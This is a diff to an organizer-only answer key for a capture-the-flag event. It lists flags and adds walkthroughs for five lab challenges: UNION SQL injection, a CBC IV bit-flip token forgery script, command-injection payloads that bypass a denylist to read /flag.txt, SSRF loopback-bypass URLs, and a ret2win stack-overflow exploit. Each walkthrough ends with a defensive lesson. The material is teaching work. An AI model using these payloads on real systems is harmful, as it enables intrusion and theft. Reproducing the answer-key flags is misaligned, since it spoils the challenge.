@@ -3,7 +3,7 @@
 > **DO NOT share this file or the `organizer/` folder with students.**
 > Students use the CTFd site. Each team downloads its own files, and the flag in those files is not the string in the table below.
 
-On the live site, for the file-based challenges the flag is the canonical flag plus `_` and a 4-character team code (Floodgate replaces four characters instead of appending). **Challenges 01 and 20 are deployed as a live container per team (ctfd-whale); their flag is a fully random `TAIBAH{…}` string issued by the platform — it does not match the fixed string in the table below and cannot be predicted, so recover it from the running instance.** The walkthroughs below still show how to recover each flag. A copied flag does not score for another team.
+On the live site, for the file-based challenges the flag is the canonical flag plus `_` and a 4-character team code (Floodgate replaces four characters instead of appending). **Seven challenges — 01, 20, 21, 22, 23, 24 and 25 — are deployed as a live container per team (ctfd-whale); their flag is a fully random `TAIBAH{…}` string issued by the platform — it does not match any fixed string and cannot be predicted, so recover it from the running instance.** The walkthroughs below still show how to recover each flag. A copied flag does not score for another team.
 
 ---
 
@@ -31,8 +31,15 @@ On the live site, for the file-based challenges the flag is the canonical flag p
 | 18 | Deleted but Not Forgotten | 250 | `TAIBAH{g1t_n3v3r_f0rg3ts_4_c0mm1t}` |
 | 19 | Onion Layers         | 250    | `TAIBAH{p33l1ng_th3_3nc0d1ng_0n10n}` |
 | 20 | Token of Trust       | 350    | `TAIBAH{w34k_jwt_s3cr3ts_unl0ck_v4ults}` † |
+| 21 | Caravan Ledger       | 250    | live per-team, random ‡ |
+| 22 | Sealed Scroll        | 400    | live per-team, random ‡ |
+| 23 | Desert Diagnostics   | 300    | live per-team, random ‡ |
+| 24 | Mirage Preview       | 350    | live per-team, random ‡ |
+| 25 | Floodgate Override   | 400    | live per-team, random ‡ |
 
 † **File-version flag only.** At the event, 01 and 20 run as a live container per team and the flag is a random `TAIBAH{…}` string issued by the platform, not this fixed string. See their walkthroughs below and [`../ctfd-platform/deploy/`](../ctfd-platform/deploy/README.md).
+
+‡ **Live-only challenge (no file version).** Challenges 21–25 exist only as a per-team container; each instance issues its own random `TAIBAH{…}` flag. Recover it from the running instance as the walkthrough shows. Images and organizer notes: [`../ctfd-platform/deploy/`](../ctfd-platform/deploy/README.md).
 
 ---
 
@@ -393,3 +400,117 @@ CyberChef recipe: **From Base64 → From Hex → From Base32 → Zlib Inflate �
    ```
 
 **Lesson:** An HS256 JWT is only as strong as its secret, and anyone holding one token can brute-force the secret offline, then mint an admin token themselves. Use long random secrets (or asymmetric RS256/EdDSA keys), and never reuse one secret for several purposes.
+
+### 21 — Caravan Ledger (Web / SQL Injection)
+
+Live per-team website. The search box is concatenated into
+`SELECT name, cargo FROM caravans WHERE name LIKE '%<input>%'` with no escaping,
+and SQL errors are printed on the page.
+
+1. A single quote `'` produces a SQL error → the query is injectable and has **two**
+   output columns.
+2. Enumerate the schema: `/?q=' UNION SELECT name, sql FROM sqlite_master-- -`
+   reveals a `secrets(id, label, secret)` table.
+3. Exfiltrate: `/?q=' UNION SELECT label, secret FROM secrets-- -` — the flag comes
+   back in the `cargo` column.
+
+**Lesson:** Never build SQL by string concatenation. Use parameterized queries /
+prepared statements. Echoing the database error to the user turns a blind
+injection into a trivial one.
+
+### 22 — Sealed Scroll (Cryptography / CBC bit-flip)
+
+Live per-team website. The session "scroll" is `base64url(IV || AES-CBC(plaintext))`
+with **no MAC**, and the first plaintext block, shown on the page, is
+`role=guest;xxxxx`. In CBC, `P0 = decrypt(C0) XOR IV`, so flipping `IV[i]` flips
+plaintext byte `i` of block 0 and nothing else. `guest` is at offsets 5–9:
+
+```python
+import base64, re, urllib.request
+page = urllib.request.urlopen("http://<instance>/").read().decode()
+tok = re.search(r'<pre id="scroll">([^<]+)</pre>', page).group(1).strip()
+raw = base64.urlsafe_b64decode(tok + "=" * (-len(tok) % 4))
+iv, ct = bytearray(raw[:16]), raw[16:]
+for i, (g, a) in enumerate(zip(b"guest", b"admin")):
+    iv[5 + i] ^= g ^ a
+forged = base64.urlsafe_b64encode(bytes(iv) + ct).rstrip(b"=").decode()
+print(urllib.request.urlopen(f"http://<instance>/vault?token={forged}").read().decode())
+```
+
+Only the IV changed, so the PKCS7 pad block stays valid and `/vault` returns the flag.
+
+**Lesson:** CBC provides confidentiality, not integrity. Without a MAC — or better, an
+AEAD mode such as AES-GCM — an attacker can flip ciphertext/IV bits to change the
+plaintext predictably. Authenticate ciphertext (encrypt-then-MAC, or AEAD).
+
+### 23 — Desert Diagnostics (Web / Command Injection)
+
+Live per-team website. The `host` field is dropped onto a shell command line,
+`ping -c 1 -W 1 <host>`, run with `shell=True`. A denylist blocks whitespace, `;`
+and `&`, but not the pipe or `${IFS}`. The flag is written to `/flag.txt`.
+
+```
+/?host=127.0.0.1|cat${IFS}/flag.txt      # ${IFS} rebuilds the space
+/?host=127.0.0.1|cat</flag.txt           # equivalent, using a redirect
+```
+
+The combined stdout/stderr is echoed, so the file contents return even though
+`ping` itself has no raw-socket permission in the container.
+
+**Lesson:** Never build a shell command from user input. Pass an argument array
+(`subprocess.run(["ping", "-c", "1", host])`) and validate the host. Character
+blocklists are trivially bypassed (`${IFS}`, `<`, `$()`, tabs); allowlist instead.
+
+### 24 — Mirage Preview (Web / SSRF)
+
+Live per-team website. The preview fetches any URL **server-side**, guarded only by a
+substring blocklist of `localhost` and `127.0.0.1`. An internal admin panel listens on
+`127.0.0.1:8081` inside the container and serves the flag at `/flag`; players can only
+reach port 80.
+
+Reach loopback with a spelling the blocklist misses:
+
+```
+/?url=http://0.0.0.0:8081/flag
+/?url=http://2130706433:8081/flag        # decimal form of 127.0.0.1
+```
+
+→ `vault key: TAIBAH{...}`.
+
+**Lesson:** SSRF turns the server into a proxy into places the attacker can't reach
+directly — cloud metadata endpoints, admin panels, loopback services. Resolve the host
+first and block private/loopback ranges on the resolved IP; don't rely on string
+matching, which misses `0.0.0.0`, decimal/hex IPs, IPv6, and DNS rebinding.
+
+### 25 — Floodgate Override (Pwn / ret2win)
+
+Live per-team **raw TCP** service. On connect it prints itself as base64 — decode that to
+get the binary. It is x86-64, **no PIE, no stack canary**. `vuln()` does
+`read(0, buf, 512)` into `char buf[64]`, and `win()` prints `getenv("FLAG")` but is never
+called on the normal path.
+
+Overwrite the saved return address (64-byte buffer + 8-byte saved rbp = offset 72) with
+the fixed address of `win`:
+
+```python
+import base64, re, socket, struct
+s = socket.create_connection(("<host>", <port>)); s.settimeout(10)
+buf = b""
+while b"override code:" not in buf:
+    buf += s.recv(4096)
+elf = base64.b64decode(
+    re.search(rb"BEGIN floodgate \(base64\) ---\s*(.*?)\s*--- END", buf, re.S).group(1))
+win = 0x4011cc                       # nm floodgate | grep ' win'  (fixed: -no-pie, pinned build)
+s.sendall(b"A" * 72 + struct.pack("<Q", win))
+print(s.recv(4096).decode(errors="replace"))
+```
+
+The build image is pinned, so `win`'s address is stable across nodes; a decompiler or
+`nm floodgate | grep ' win'` gives it. The service then prints `[FLOODGATES OPEN]` and the
+flag. (`pwntools` makes this a three-liner: `ELF("floodgate").symbols["win"]` and
+`remote(host, port)`.)
+
+**Lesson:** A single unbounded read into a stack buffer is the classic memory-safety bug.
+The usual defences — stack canaries, PIE/ASLR, NX, and bounds-checked input — are exactly
+what this binary disables to make the lesson visible. Prefer memory-safe languages, and at
+minimum read into a buffer with its size (`fgets`, `read(fd, buf, sizeof buf)`).
